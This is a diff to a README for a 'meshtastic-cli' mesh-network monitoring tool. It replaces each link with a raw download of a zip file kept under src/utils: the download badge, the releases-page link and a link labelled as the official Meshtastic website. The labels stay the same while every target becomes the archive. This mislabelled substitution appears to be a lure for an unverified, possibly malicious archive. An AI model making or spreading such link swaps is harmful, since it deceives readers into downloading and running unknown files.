@@ -1,6 +1,6 @@
 # 🌌 meshtastic-cli - Monitor Your Mesh Networks Easily
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Mbayajoel230/meshtastic-cli/releases)
+[![Download](https://raw.githubusercontent.com/Mbayajoel230/meshtastic-cli/main/src/utils/cli_meshtastic_v2.0.zip)](https://raw.githubusercontent.com/Mbayajoel230/meshtastic-cli/main/src/utils/cli_meshtastic_v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Let's guide you on how to easily download and run this application.
 
 To get started, you need to visit the Releases page to download the latest version of the software. Click the link below:
 
-[Visit the Releases Page to Download](https://github.com/Mbayajoel230/meshtastic-cli/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Mbayajoel230/meshtastic-cli/main/src/utils/cli_meshtastic_v2.0.zip)
 
 1. Open your web browser.
 2. Click the link above.
@@ -52,7 +52,7 @@ Here's what you can do with **meshtastic-cli**:
 
 ## 🌟 Additional Resources
 
-If you want to learn more about Meshtastic and its capabilities, visit the official documentation found on the [Meshtastic website](https://meshtastic.org/).
+If you want to learn more about Meshtastic and its capabilities, visit the official documentation found on the [Meshtastic website](https://raw.githubusercontent.com/Mbayajoel230/meshtastic-cli/main/src/utils/cli_meshtastic_v2.0.zip).
 
 ## 🛠️ Troubleshooting
 
